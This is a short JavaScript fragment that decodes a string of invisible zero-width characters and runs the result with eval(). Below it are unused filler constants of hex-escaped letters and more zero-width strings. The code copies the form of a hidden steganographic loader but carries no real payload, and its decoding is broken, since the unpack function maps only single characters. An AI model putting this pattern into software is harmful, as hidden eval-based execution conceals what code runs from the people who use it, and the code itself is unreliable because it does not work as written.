function unpack(x){if(x==='\u200b')return '0'; if(x==='\u200c')return '1';return x;}
const pad='\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41', marker='\u200b\u200c\u200d\u200b', decoded=unpack(marker);
eval(decoded);

const a1='\x41\x41\x41\x41\x41\x41\x41';
const a2='\x42\x42\x42\x42\x42\x42\x42';
const a3='\x43\x43\x43\x43\x43\x43\x43';
const a4='\x44\x44\x44\x44\x44\x44\x44';
const a5='\x45\x45\x45\x45\x45\x45\x45';
const a6='\x46\x46\x46\x46\x46\x46\x46';
const u0='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
const u1='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
const u2='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
const u3='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
const u4='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
const u5='\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d';
